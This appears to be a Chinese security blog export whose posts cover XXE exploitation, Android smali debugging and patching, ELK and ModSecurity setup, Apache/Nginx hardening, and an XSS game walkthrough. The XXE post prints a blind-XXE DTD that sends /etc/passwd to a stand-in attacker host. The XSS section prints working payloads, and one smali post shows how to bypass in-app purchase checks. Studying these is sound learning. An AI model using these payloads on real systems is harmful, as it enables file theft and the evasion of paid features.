XML外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取。因此，XML实体被使用的次数越多，越有帮助。 0×02. 什么是XML外部实体攻击？有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。比如，下面的代码将获取系统上folder/file的内容并呈献给用户。 0×03. 怎么甄别一个XML实体攻击漏洞？最直接的回答就是： 甄别那些接受XML作为输入内容的端点。 但是有时候，这些端点可能并不是那么明显(比如，一些仅使用JSON去访问服务的客户端)。在这种情况下，渗透测试人员就必须尝试不同的测试方式，比如修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。 如何利用EXCEL文档来造成XXE漏洞根据原文档介绍，是对excel文件进行解压缩，来替换其中的[Content-Types].xml或者xl/workbook.xml文件，来造成XXE漏洞。 但根据利用情况的不同，还有可以替换的文件: _rels/.rels 和 xl/worksheets/sheet1.xml等文件。 因此我们自己的系统在文件上传处，也存在一块，类似的XXE利用。 例如此处文件上传处，上传EXCEL文件。 在文件中的[Content-Types].xml中写入测试POC： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http://xxx.com/&quot; &gt;]&gt; &lt;name&gt;&amp;GVI;&lt;/name&gt; 于是便可以在我们自己的VPS上监听到来自服务器的请求了。 由于是Blind XXE，所以我们利用在我们自己的VPS上存入如下文件： &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &#39;http://ATTACKESERVER.com/?%file;&#39;&gt;&quot;&gt; %all; 远程利用类似如下： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERSERVER.com/xxe_file.dtd&quot;&gt; 这时候便可以在监听上收到远程文件的读取。 当然这一块还可以尝试利用已有的脚本，来自动的开启web监听和ftp来传输文件。 https://github.com/joernchen/xxeserve 其他文章介绍： 1.XXE漏洞利用技巧：从XML到远程代码执行 2.利用OOB XXE盲攻击获取文件系统访问权限","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"Android Studio 动态调试","slug":"Android-Studio-动态调试","date":"2019-01-29T08:47:40.000Z","updated":"2019-01-29T08:49:57.551Z","comments":true,"path":"2019/01/Android-Studio-动态调试/","link":"","permalink":"/2019/01/Android-Studio-动态调试/","excerpt":"","text":"Android Studio 动态调试调试仍然使用我们喜闻乐见的Android Studio，不过使用的是AS3，AS在3.0版本后便不在使用DDMS，调试smali上有点不适应，不过我们仍然可以在配置SDK后，在命令行输入“monitor”来打开DDMS。 apk使用我们自己生成的一个简单的登陆判断界面来做测试。 使用网上的一段登陆代码如下 生成APK后，利用AK反编译为smali代码。 然后用AS打开反编译后的文件夹，当然在利用AS调试smali的时候，需要安装ideasmali插件，具体可以百度插件名即可下载。 调试的时候需要我们进行端口的转发，可以先用DDMS查看一下端口是否是8700（一般默认为8700），因为启动AS后会占有相应的端口，导致无法打开DDMS。 具体使用方式为：打开DDMS。在CMD命令行输入以下内容，其中package为包名。MainActivity是需要调试的activity名，具体看情况修改。 adb shell am start -D -n package/.MainActivity 可以看到手机端或者模拟器端已经以调试的方式启动我们相应的程序了。在DDMS中就可以看到一只红色的小蜘蛛了。后面有一个端口默认应该是8700。然后查看进程PID，假设为1980。 adb forward tcp:8700 jdwp:1980 进行端口转发到。转发的时候要先关闭DDMS，不然显示端口被占用。 在使用AS打开我们需要的文件后，如以下内容。 配置远程调试参数，修改端口为8700. 然后在需要的地方设置断点，此处在账户密码的判断处下断点。启动调试，然后就可以看到界面显示到我们断点前的地方了。在模拟器上输入账号密码后，就可以看到断点被执行。 可以看到下面两部分第一部分为为v0赋值为admin，调用String类的equals方法来判断v0参数和p1对象值是否相同，并把结果赋值给v0，一个布尔值。第二部分，判断v0是否为0，等于0跳转到:cond_0处。不等于0则继续，同样为v0赋值一个字符串为12345，调用方法判断是否相同，以下则和上面基本一致。 此时，需要做些什么修改，判断，以后参数变化，可以在下面的variables查看，上图中的参数就是在模拟器中输入的参数显示。","categories":[],"tags":[{"name":"移动安全","slug":"移动安全","permalink":"/tags/移动安全/"}]},{"title":"Android逆向逻辑修改入门","slug":"Android逆向逻辑修改入门","date":"2019-01-28T08:28:34.000Z","updated":"2019-01-29T06:49:42.179Z","comments":true,"path":"2019/01/Android逆向逻辑修改入门/","link":"","permalink":"/2019/01/Android逆向逻辑修改入门/","excerpt":"","text":"Android 逻辑判断修改使用AS创建一个工程，利用生成工程的初始代码来做。 创建新的layout，在mainactivity中添加新的layout标识。在显示界面的时候加一个判断逻辑，完成后类似如下 if(a==1) { setContentView(R.layout.activity_main); } else setContentView(R.layout.activity_main2); } 于是乎，当a为1的时候显示activity_main界面字段。不为1显示activity_main2字段。 一般情况下，对于有些需要内购，或者某些情况才给你显示的界面的时候，界面不是从后端返回而是返回json参数由前端接收显示的时候，可以从前端修改逻辑来绕过判断。 生成smali代码，其中主要部分为下： .method protected onCreate(Landroid/os/Bundle;)V .registers 4 .param p1, &quot;savedInstanceState&quot; # Landroid/os/Bundle; .prologue .line 17 invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;-&gt;onCreate(Landroid/os/Bundle;)V .line 18 const/4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const/4 v1, 0x1 if-ne v0, v1, :cond_e .line 20 const v1, 0x7f09001c invoke-virtual {p0, v1}, Lcom/example/user/application/MainActivity;-&gt;setContentView(I)V .line 24 :goto_d return-void .line 23 :cond_e const v1, 0x7f09001d invoke-virtual {p0, v1}, Lcom/example/user/application/MainActivity;-&gt;setContentView(I)V goto :goto_d .end method 整体的代码相当简单轻松，来看判断代码处。 .line 18 const/4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const/4 v1, 0x1 if-ne v0, v1, :cond_e 其中if-ne，逻辑显示v0不等于v1，跳转到cond_e标签处。 修改一：直接修改if-ne判断形式，修改为if-eq，这样只要不完成正常的逻辑操作，都会跳转到我们想看的界面。 修改二：由于判断处是根据参数a的值和1做对比，所以我们直接对a重赋值(以上的a赋值可以粗略的看为是请求获取的值)。 .line 18 const/4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const/4 v1, 0x1 const/4 v0, 0x1 if-ne v0, v1, :cond_e 修改三：利用强制跳转，在需要去查看，或者执行下去的地方添加标签，goto_1，然后在判断执行前强制跳转进去。 const/4 v1, 0x1 goto :goto_1 if-ne v0, v1, :cond_0 .line 20 :goto_1 const v1, 0x7f09001c","categories":[],"tags":[{"name":"移动安全","slug":"移动安全","permalink":"/tags/移动安全/"}]},{"title":"Android 逆向Smali语言初识","slug":"Android-逆向Smali语言初识","date":"2019-01-22T07:55:56.000Z","updated":"2019-01-22T07:58:12.807Z","comments":true,"path":"2019/01/Android-逆向Smali语言初识/","link":"","permalink":"/2019/01/Android-逆向Smali语言初识/","excerpt":"","text":"Android 逆向Smali语言初识​ Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。 函数语法​ Smali 语法规范与格式Smali 是对 Dalvik 虚拟机字节码的一种解释，虽然不是官方标准语言，但所有语句都遵循一套语法规范。要了解 smali 语法规范，可以先从了解 Dalvik 虚拟机字节码的指令格式开始。3.1 Dalvik 虚拟机字节码指令格式在 Android 4.0 源码 Dalvik/docs 目录下提供了一份文档 instruction-formats.html，里面详细列举了 Dalvik 虚拟机字节码指令的所有格式。 Dalvik 虚拟机字节码的类型、方法和字段的表示方法3.2.1 类型Dalvik 字节码有两种类型，基本类型和引用类型。对象和数组是引用类型，其它都是基本类型。 Dalvik 字节码类型描述符 ​ 描述符 类型 V void，只能用于返回值类型 Z boolean B byte S short C charI intJ long（64 位） F floatD double（64 位） L Java 类类型 [ 数组类型 常见的代码含义： #表示当前代码在源java文件中的行数。 .line .line 34 #表示来自公共方法methodAReturn返回值是一个对象com.bolex.AA method .method public methodAReturn(Lcom/bolex/AA;Lcom/bolex/AA;)Lcom/bolex/AA; #表示该函数上需要使用3个寄存器 registers .registers 3 #表示接收两个入参都是AA对象，并标记寄存器p1和p2 param .param p1, &quot;mAA&quot; # Lcom/bolex/AA; .param p2, &quot;sAA&quot; # Lcom/bolex/AA; #表示函数内执行的起始标记 .prologue .prologue #表示 返回寄存器上p1对象 return-object return-object p1 #表示函数结束标记 .end method #创建一个AA对象 new-instance new-instance v0, Lcom/bolex/AA; #表示使用无参构造方法直接调用 invoke-direct invoke-direct {v0}, Lcom/bolex/AA;-&gt;&lt;init&gt;()V #表示为虚拟方法 invoke-virtual #数组操作指令 #new-array构造指定类型I也就是int类型并且把值赋给v0 # v0=new int[8]; new-array v0,v0,[ I #array-length 获取给定v0寄存器中数组的长度并将值赋给v1寄存器，数组长度就是数组的个数。v1=v0,也就是说v1=8 array-length v1,v0 # 方法调用指令 #new-instance v1,... 构造一个指定类型对象的新实例，并将对象引用赋值给v1寄存器。 #L表示java类型中的任何类， # StringBuilder对象是动态对象，允许扩充它所封装的字符串中字符的数量，但是您可以为它可容纳的最大字符数指定一个值。相当于是一个string的升级版。 new-instance v1,Ljava/lang/StringBuilder; # 方法调用指令 #&lt;init&gt;:在实例创建出来的时候调用，包括调用new操作符； new-direct v1,Ljava/lang/StringBuilder;-&gt;&lt;init&gt;( )v # 跳转指令 if (v0!=0) #if-nez 的意思就是 not equal zero 如果v0不等于0，那么就继续向下执行，如果等于0就跳转到标号名为cond_0的位置。 if-nez v0, : cond_0 # goto的含义就是强行跳转到标号名为goto_0的地方 goto :goto_0 #标号cond_0 ：cond_0 # 数据转换指令 #把int型变量转变为float变量 int-to-float v2,v2 # 数据运算指令 # 相当于 v2+=v2，第一个v2是寄存器，第二个和第三个是数据 add-float v2,v2,v2 Java编译dex文件以下用常见的hello world来表示smali语法结构。 public class firedt { public static void main(String[] args){ System.out.println(&quot;hello world&quot;); } } 在AS中打开代码，安装java2smali插件后，在build-&gt;compile to smali编译为smali代码。 编译完成后的代码为以下，并对关键代码进行注释含义： .class public Lfiredt; #定义一个firedt类 .super Ljava/lang/Object; #继承object类 .source &quot;firedt.java&quot; #由firedt.java编译来 # direct methods .method public constructor &lt;init&gt;()V .registers 1 #注册一个寄存器 .prologue #代码开始 .line 1 #第一行 invoke-direct {p0}, Ljava/lang/Object;-&gt;&lt;init&gt;()V return-void .end method .method public static main([Ljava/lang/String;)V #说明一个main的静态方法，类型为void .registers 3 .prologue .line 3 sget-object v0, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream; #获取变量对象保存到v0 const-string v1, &quot;hello world&quot; #赋值一个字符串v1=hello world invoke-virtual {v0, v1}, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V #调用printstream的println方法把v0赋值v1 .line 4 return-void .end method #方法结束，一个method对应一个end method 参考资料： smali语法中文参考文档 逆向之Smali入门学习","categories":[],"tags":[{"name":"移动安全","slug":"移动安全","permalink":"/tags/移动安全/"}]},{"title":"ELK搭建使用","slug":"ELK搭建使用","date":"2018-11-04T09:05:12.000Z","updated":"2018-11-04T09:34:33.734Z","comments":true,"path":"2018/11/ELK搭建使用/","link":"","permalink":"/2018/11/ELK搭建使用/","excerpt":"","text":"ELK日志分析系统搭建使用ELK是三个开源软件的缩写，分别表示：Elasticsearch , Logstash, Kibana , 它们都是开源软件。但现在新增了一个FileBeat，它是一个轻量级的日志收集处理工具(Agent)，Filebeat占用资源少，适合于在各个服务器上搜集日志后传输给Logstash，但此次并不添加filebeat，仍然以es、logstash、kibana做搭建使用。 使用环境：centos6.5 192.168.253.138作为日志来源服务器 apache ​ centos7 192.168.253.139 作为显示终端服务器 安装jdk首先安装Java，版本1.8以上。 安装Elasticsearch下载elasticsearch ， wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.4.2.tar.gz 修改解压文件中的config/elasticsearch.yml 文件 # 这里指定的是集群名称，需要修改为对应的，开启了自发现功能后，ES会按照此集群名称进行集群发现 cluster.name: es_cluster node.name: es_cluster_1 # 数据目录 path.data: /data/data # log 目录 path.logs: /data/logs # 修改一下ES的监听地址，这样别的机器也可以访问 network.host: 192.168.253.139 # 默认的端口号 http.port: 9200 discovery.zen.ping.unicast.hosts: [&quot;192.168.253.138&quot;, &quot;192.168.253.139&quot;] 在使用中可能会因为系统内存等问题导致启动失败，所以可以预调整系统参数。 设置内核参数 vi /etc/sysctl.conf # 增加以下参数 vm.max_map_count=655360 执行以下命令，确保生效配置生效： sysctl -p 设置资源参数 vi /etc/security/limits.conf # 修改 * soft nofile 65536 * hard nofile 131072 * soft nproc 65536 * hard nproc 131072 设置用户资源参数 vi /etc/security/limits.d/20-nproc.conf # 设置elk用户参数 elk soft nproc 65536 启动elk需要非root用户，所以创建elk用户。 useradd elk #创建用户elk groupadd elk #创建组elk useradd elk -g elk #将用户添加到组 mkdir -pv /data/{data,logs} # 创建数据和日志目录 # 修改文件所有者 chown -R elk:elk /data/ chown -R elk:elk /etc/elasticsearch/ 切换到elk用户，启动服务 启动文件 /etc/elasticsearch/bin/elasticsearch 服务器要关闭防火墙 systemctl stop firewalld.service 这时候可以看到log输出，节点正常启动. 用浏览器访问，同时可以正常使用 安装Logstash下载解压 wget https://artifacts.elastic.co/downloads/logstash/logstash-6.4.2.tar.gz 在解压后目录执行 /usr/share/logstash/bin/logstash -e &#39;input { stdin { } } output { stdout {} }&#39; 在命令行输入什么内容讲原样输出，比如： 显示正常以后再去修改配置文件，需要自己添加，创建如下内容文件。 cat logstash-simple.conf input{ file { path =&gt; &quot;/var/log/httpd/*&quot; start_position =&gt; beginning } } output { stdout { codec=&gt; rubydebug } elasticsearch { hosts =&gt; &quot;192.168.253.132:9200&quot; protocol =&gt; &quot;http&quot; index =&gt; &quot;logstash-%{+YYYY-MM}&quot; } } 开启服务，执行如下命令： /usr/share/logstash/bin/logstash -f /usr/share/logstash/config/logstash-simple.conf 我们可以查看 ES 是否接收到了数据： Kibana的安装wget https://artifacts.elastic.co/downloads/kibana/kibana-6.4.2-linux-x86_64.tar.gz 编辑kibana.yml配置文件 vi /usr/share/kibana/config/kibana.yml 修改以下参数： server.port: 5601 #开启默认端口5601，本文修改默认端口为5602 server.host: “192.168.253.139” #站点地址 elasticsearch.url: http://192.168.253.139:9200 #指向elasticsearch服务的ip地址 kibana.index: “.kibana” 启动 执行以下命令启动： /usr/share/kibana/bin/kibana 测试浏览器访问 访问：http://192.168.253.139:5602 正常启动后，需要配置索引，设置logstash-* ，添加索引和Available fields后，点击Discover就可以看到logstash传输过来的日志信息。 然后可以手动添加fields参数或者创建图表。 yum 安装以上安装方式为下载配置安装，可以使用yum安装。 # 导入私钥 rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch # 添加yum源 vim /etc/yum.repos.d/es.repo yum源内容： [elasticsearch-6.x] name=Elasticsearch repository for 6.x packages baseurl=https://artifacts.elastic.co/packages/6.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md 执行安装： # 安装java + ELK yum install java-1.8.0-openjdk.x86_64 elasticsearch.noarch kibana.x86_64 logstash.noarch -y # 修改配置文件 vi /etc/logstash/logstash.yml vi /etc/elasticsearch/elasticsearch.yml vi /etc/kibana/kibana.yml # 启动服务 systemctl start logstash.service elasticsearch.service kibana.service 配置文件和上文相同修改，如若无法访问，关闭防火墙 。 参考链接： https://blog.csdn.net/KingBoyWorld/article/details/78555120 https://www.cnblogs.com/yuhuLin/p/7018858.html https://www.elastic.co/products","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Apache中ModSecurity安装配置","slug":"Apache中ModSecurity安装配置","date":"2018-10-22T07:54:13.000Z","updated":"2018-10-22T10:28:19.050Z","comments":true,"path":"2018/10/Apache中ModSecurity安装配置/","link":"","permalink":"/2018/10/Apache中ModSecurity安装配置/","excerpt":"","text":"环境为centos 6.5 apache2.2 modsecurity2.9.2 安装mod_security的依赖 yum install gcc make httpd-devel libxml2 pcre-devel libxml2-devel curl-devel git 下载最新稳定的mod_security源代码 wget https://www.modsecurity.org/tarball/2.9.2/modsecurity-2.9.2.tar.gz 安装步骤： tar xzf modsecurity-2.9.2.tar.gz cd modsecurity-2.9.2 ./configure make install cp modsecurity.conf-recommended /etc/httpd/conf.d/modsecurity.conf cp unicode.mapping /etc/httpd/conf.d/ 安装完成后调整配置，修改httpd.conf LoadModule security2_module modules/mod_security2.so 如下配置，需要根据目录位置修改，因为modsecurity安装在/etc/httpd目录，配置文件在conf文件，所以不在写入以下配置。 &lt;IfModule security2_module&gt; Include conf.d/modsecurity.conf &lt;/IfModule&gt; 配置完成后下载owasp的规则： cd /etc/httpd git clone https://github.com/SpiderLabs/owasp-modsecurity-crs.git 或 wget https://github.com/SpiderLabs/owasp-modsecurity-crs/archive/v3.1.0-rc1.tar.gz mv owasp-modsecurity-crs modsecurity-crs cd modsecurity-crs cp crs-setup.conf.example modsecurity-crs-config.conf 在httpd.conf中修改 Include modsecurity-crs/modsecurity-crs-config.conf Include modsecurity-crs/rules/*.conf 修改完成后重启服务： service httpd restart 完成以后尝试SQL注入攻击，可以看到被拦截的页面。 在apache日志中查看error信息： 从上图可以看到拦截的类型和规则id，还有规则的目录文件。去对应的规则处查看规则文件，可以看到如下的规则匹配。 关于modsecurity的配置，根据各自设置的地址，比如当前地址为/etc/httpd/conf.d中。 SecRuleEngine On 设置为mod是否开启，默认设置为Detection Only，作用是只检测。Off则是关闭mod。 SecRequestBodyAccess On 检查请求体，默认开启，可以选择On或Off。 SecAuditEngine RelevantOnlySecAuditLogRelevantStatus “^(?:5|4(?!04))” SecAuditLogParts ABIJDEFHZ SecAuditLogType SerialSecAuditLog /var/log/modsec_audit.log 记录日志审计内容，文件地址等，如下图所示，ABCE等，修改SecAuditLogParts参数，可以记录不同的日志部分。对调试waf，修改配置策略很有用。 然后，如果需要修改其他配置项，比如403错误页面，直接再httpd.conf中修改403错误页面即可。 参考链接： http://www.vue5.com/centos/23142.html https://www.cnblogs.com/xiachj/p/4112194.html","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Apache和Nginx安全配置","slug":"Apache和Nginx安全配置","date":"2018-10-09T08:21:20.000Z","updated":"2018-10-09T14:38:34.712Z","comments":true,"path":"2018/10/Apache和Nginx安全配置/","link":"","permalink":"/2018/10/Apache和Nginx安全配置/","excerpt":"","text":"apache安全配置apache运行原理Apache是基于模块化设计的，它的核心代码并不多，大多数的功能都被分散到各个模块中，各个模块在系统启动的时候按需载入。从配置文件中可以看到加载的各个模块。 apache在启动阶段采用root权限来获取更多的资源使用权限，这个时候会加载配置文件，模块，资源文件等，在下一个运行阶段，Apache为了获得系统资源最大的使用权限，将以特权用户root完成启动。分11个阶段处理用户的请求。 apache的两种工作模式Apache通过MPM(多路处理模块)来使用操作系统的资源，对进程和线程池进行管理。Apache为了能够获得更好的运行性能，针对不同的平台 (Unix/Linux、Window)提供了不同的MPM，用户可以根据实际情况进行选择，其中最常使用的MPM有 prefork和worker两种。 prefork 一个单独的控制进程(父进程)负责产生子进程，这些子进程用于监听请求并作出应答。Apache总是试图保持一些备用的 (spare)或是空闲的子进程用于迎接即将到来的请求。这样客户端就无需在得到服务前等候子进程的产生。在Unix系统中，父进程通常以root身份运行以便邦定80端口，而 Apache产生的子进程通常以一个低特权的用户运行。User和Group指令用于配置子进程的低特权用户。 worker 每个进程能够拥有的线程数量是固定的。服务器会根据负载情况增加或减少进程数量。一个单独的控制进程(父进程)负责子进程的建立。每个子进程能够建立 ThreadsPerChild数量的服务线程和一个监听线程，该监听线程监听接入请求并将其传递给服务线程处理和应答。Apache总是试图维持一个备 用(spare)或是空闲的服务线程池。这样，客户端无须等待新线程或新进程的建立即可得到处理。在Unix中，为了能够绑定80端口，父进程一般都是以 root身份启动，随后，Apache以较低权限的用户建立子进程和线程。User和Group指令用于配置Apache子进程的权限。 apache 在centos下配置apache配置文件，默认文件在/etc/httpd/conf/httpd.conf路径下 那么简单理解一下，配置参数的含义和使用，Allow和Deny可以用于apache的conf文件或者.htaccess文件中（配合Directory, Location, Files等），用来控制目录和文件的访问授权。所以，最常用的是：Order Deny,AllowAllow from All 注意“Deny,Allow”中间只有一个逗号，也只能有一个逗号，有空格都会出错；单词的大小写不限。上面设定的含义是先设定“先检查禁止设定，没有禁止的全部允许”，而第二句没有Deny，也就是没有禁止访问的设定，直接就是允许所有访问了。 但是如果想限制IP访问，如下写 Order Deny,Allow Deny from 192.168.1.1 Allow from all 这时候限制不起作用，Order取规则为最后一个Allow规则，首先限制IP访问，但是会继续查看Allow规定指定的信息，IP又在all中，所以限制不起作用。所以可以如下写： Order Deny,Allow Deny from 192.168.1.1 或者 Order Allow,Deny Allow from all Deny from 192.168.1.1 比如：如下的常用配置 1、在配置文件开始部分和下部有两个配置项，用来隐藏banner信息： ServerTokens OS 修改为：ServerTokens Prod （在出现错误页的时候不显示服务器操作系统的名称）ServerSignature On 修改为：ServerSignature Off （不回显apache版本信息） 2、apache在一些系统的默认配置中，开启目录浏览，所以可以使用以下关闭设置。 将Options Indexes FollowSymLinks 改为 Options -Indexes FollowSymLinks 3、取消部分目录的php执行权限 &lt;Directory &quot;/var/www/html/upload&quot;&gt; &lt;FilesMatch &quot;\\.(?i:php|php3|php5)$&quot;&gt; Deny from all &lt;/FilesMatch&gt; &lt;/Directory&gt; //在upload目录下，尽可能多匹配后缀php|php3|php5的文件，不分大小写。 还可以在主机配置文件中增加php_flag engine off指令即可，配置如下： Options FollowSymLinks AllowOverride None Order allow,deny Allow from all php_flag engine off 5、配置httpd.conf限制一些特殊目录的特定ip访问，如内部接口等。 &lt;Directory &quot;/var/www/html/aaa&quot;&gt; Order Deny,Allow Deny from all Allow from 192.168.1.111 &lt;/Directory&gt; 6、配置httpd.conf限制一些文件类型的访问，如txt的日志 &lt;Files ~ &quot;.txt$&quot;&gt; Order allow,deny Deny from all &lt;/Files&gt; 7、针对URL相对路径的禁止访问： &lt;Location /dir/&gt; Order allow,deny Deny from all &lt;/Location&gt; Nginx 安全配置nginx 工作原理Nginx由内核和模块组成，nginx核心模块包括：HTTP模块、EVENT模块和MAIL模块。nginx仅仅通过查找配置文件将客户端请求映射到一个location block（location是Nginx配置中的一个指令，用于URL匹配），而在这个location中所配置的每个指令将会启动不同的模块去完成相应的工作。nginx架构类似于Apache的Worker工作状态，Nginx的每一个Worker进程都管理着大量的线程，真正处理请求的是Worker之下的线程。 nginx本身不能处理PHP，它只是个web服务器，当接收到请求后，如果是php请求，则发给php解释器处理，并把结果返回给客户端。nginx一般是把请求发fastcgi管理进程处理，fastcgi管理进程选择cgi子进程处理结果并返回被nginx。 nginx涉及到两个账户，一个是nginx的运行账户，一个是php-fpm的运行账户。如果访问的是一个静态文件，则只需要nginx的运行账户对文件具有读取权限；而如果访问的是一个php文件，则首先需要nginx的运行账户对文件有读取权限，读取到文件后发现是一个php文件，则转发给php-fpm，此时则需要php-fpm账户对文件具有读取权限。 nginx 在centos下的安全配置 nginx设置问题 #隐藏 Nginx 的版本号，提高安全性。 server_tokens off; #开启高效文件传输模式，sendfile 指令指定 Nginx 是否调用sendfile 函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘 IO 重负载应用，可设置为 off，以平衡磁盘与网络 I/O 处理速度，降低系统的负载。 sendfile on; #是否开启目录列表访问，默认关闭。 autoindex off; 开头的配置 user www-data; //用户和组 worker_processes auto; //进程数 pid /run/nginx.pid; //进程文件 include /etc/nginx/modules-enabled/*.conf; //导入其他配置文件到nginx配置文件 events配置 events { worker_connections 768; //设置一个worker进程同时打开的最大连接数 # multi_accept on; //告诉nginx收到一个新连接通知后接受尽可能多的连接 } http配置 http { ## # Basic Settings ## sendfile on; //开启高效文件传输模式 tcp_nopush on; //告诉 Nginx 在一个数据包里发送所有头文件 tcp_nodelay on; //告诉 Nginx 不要缓存数据，而是一段一段的发送 keepalive_timeout 65; //连接超时时间，单位是秒 types_hash_max_size 2048; //上传文件大小限制 # server_tokens off; //隐藏 Nginx 的版本号 # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; //包含配置 default_type application/octet-stream; //默认传输类型 ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; //访问日志 error_log /var/log/nginx/error.log; //错误日志 ## # Gzip Settings ## gzip on; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } server配置 众所周知，Nginx的配置文件分为Server、Location、If等一些配置块，并且存在包含关系，和编程语言比较类似。如果在外层配置的一些选项，是可以被继承到内层的。 但这里的继承也有一些特性，比如add_header，子块中配置后将会覆盖父块中的add_header添加的所有HTTP头，造成一些安全隐患。 server配置在一些系统上不是默认的nginx配置，如果需要修改可以在nginx配置中添加，或者添加include，包含进其他的自定义server。 如下列代码，Server块添加了CSP头： server { ... add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;; add_header X-Frame-Options DENY; location = /test { add_header X-Content-Type-Options nosniff; rewrite ^(.*)$ /xss.html break; } } 但/test的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效。 禁止一个目录的访问示例：禁止访问path目录 location ^~ /path { deny all; } 可以把path换成实际需要的目录，目录path后是否带有”/“，带“/”会禁止访问该目录和该目录下所有文件。不带”/“的情况就有些复杂了，只要目录开头匹配上那个关键字就会禁止；注意要放在fastcgi配置之前。 这个常见于Nginx做反向代理的情况，动态的部分被proxy_pass传递给后端端口，而静态文件需要Nginx来处理。 假设静态文件存储在/home/目录下，而该目录在url中名字为files，那么就需要用alias设置目录的别名： location /files { alias /home/; } 此时，访问http://example.com/files/readme.txt，就可以获取/home/readme.txt文件。 但我们注意到，url上/files没有加后缀/，而alias设置的/home/是有后缀/的，这个/就导致我们可以从/home/目录穿越到他的上层目录。从而导致一个目录穿越问题。 禁止php文件的访问及执行 示例：去掉单个目录的PHP执行权限 location ~ /attachments/.*\\.(php|php5)?$ { deny all; } 示例：去掉多个目录的PHP执行权限 location ~ /(attachments|upload)/.*\\.(php|php5)?$ { deny all; } 禁止IP的访问 示例：禁止IP段的写法： deny 10.0.0.0/24; 示例：只允许某个IP或某个IP段用户访问，其它的用户全都禁止 allow x.x.x.x; allow 10.0.0.0/24; deny all; 禁用非必要的方法 if ($request_method !~ ^(GET|HEAD|POST)$ ) { return 444; } 禁用扩展名 location ~* .(txt|doc|sql|gz|svn|git)$ { deny all; } 根据用户的真实 IP 做连接限制 ## 这里取得原始用户的IP地址 map $http_x_forwarded_for $clientRealIp { &quot;&quot; $remote_addr; ~^(?P&lt;firstAddr&gt;[0-9\\.]+),?.*$ $firstAddr; } ## 针对原始用户 IP 地址做限制 limit_conn_zone $clientRealIp zone=TotalConnLimitZone:20m ; limit_conn TotalConnLimitZone 50; limit_conn_log_level notice; ## 针对原始用户 IP 地址做限制 limit_req_zone $clientRealIp zone=ConnLimitZone:20m rate=10r/s; #limit_req zone=ConnLimitZone burst=10 nodelay; limit_req_log_level notice; 参考资料： https://www.cnblogs.com/chenpingzhao/p/5785416.html https://wooyun.kieran.top/#!/drops/201.Nginx%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E7%A0%94%E7%A9%B6 https://wooyun.kieran.top/#!/drops/315.Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE https://blog.csdn.net/yf3585595511/article/details/54933646","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"XSS GAME记录","slug":"XSS-GAME记录","date":"2018-10-05T12:05:20.000Z","updated":"2019-03-12T02:43:55.753Z","comments":true,"path":"2018/10/XSS-GAME记录/","link":"","permalink":"/2018/10/XSS-GAME记录/","excerpt":"","text":"在安全文摘上看到一篇前端安全的文章，最后提到了几个xss在线游戏，有两个是之前就见过的，一个没玩过，好像也是之前的xss游戏。 文章地址：https://segmentfault.com/a/1190000016551188 首先看第一关，此网站需要科学上网。 https://xss-game.appspot.com/level1 页面可以看到所用的html代码和js，以及后端的py代码，简单尝试一下，可以发现是写入页面。 并且从code中可以看到，没有过滤，直接 &lt;script&gt;alert(2)&lt;/script&gt; 第二关，留言框，post提交数据，直接插入图片。 &lt;img src=@ onerror=alert(2)&gt; 第三关，从链接猜测是锚点xss，尝试修改锚点，发现写入页面。 但是尝试后发现，并不是直接写入如上图所示页面那么简单，而是写入了img标签 查看其中的js代码，然后使用如下payload即可。 &#39; onerror=alert(2) &#39; 第四关，点击页面按钮后显示如下，猜测是在timer的xss，查看页面代码。 在timer.html页面下可以发现如下代码，基本可以断定是写入img标签的xss，直接使用onload事件，使用连字符直接alert()。 &#39;-alert(2)-&#39; 第五关，访问后是一个登陆后的页面，这里我们先退出页面。 sign 